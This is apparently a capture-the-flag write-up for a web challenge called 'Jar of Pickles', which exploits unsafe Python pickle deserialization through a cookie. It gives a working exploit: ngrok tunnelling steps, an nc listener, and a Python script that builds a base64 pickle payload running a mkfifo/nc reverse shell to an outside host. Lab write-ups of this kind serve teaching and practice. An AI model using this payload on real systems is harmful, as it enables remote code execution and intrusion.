# Name: Web: Exotic Attacks: Jar of Pickles

## Vulnerability

Unsafe usafe of Python3 `pickle` module.

## Exploit

The exploit involves opening a reverse shell. You'll need to:
1. Create an account on [ngrok](https://ngrok.com/) (also confirm your email address).
2. Install `ngrok` on you machine.
3. Forward your 1234 port using: `ngrok tcp 1234`. A ngrok host and IP will be forwarded to your local port.

The instructions are also available [here](https://securiumsolutions.com/blog/reverse-shell-using-tcp/). Don't close the `ngrok` terminal until we are done.

Coming back to the challenge: click on the picture, it will take you to `/jar`.
Notice the `pickles` cookie.

Use `nc -nvlk 1234` in another terminal to open a connection on your internal port.

Then run this program that prints the encoded pickled object of this class that spawns a shell (change the IP to yours).

```python
import base64
import os
import pickle
import requests

NGROK_HOST = "" # TODO: ngrok host
NGROK_PORT = 0 # TODO: ngrok port

class RCE:
    def __reduce__(self):
        cmd = "rm -rf /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc %s %d > /tmp/f" % (NGROK_HOST, NGROK_PORT)

        return os.system, (cmd,)


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled).decode("utf-8"))
```

Take the output and set it as the Cookie value.
Make the request again.
You should have a shell now in the `nc` terminal; perform a `cat` on the flag file.

Exploit in `../sol/solution.sh`.
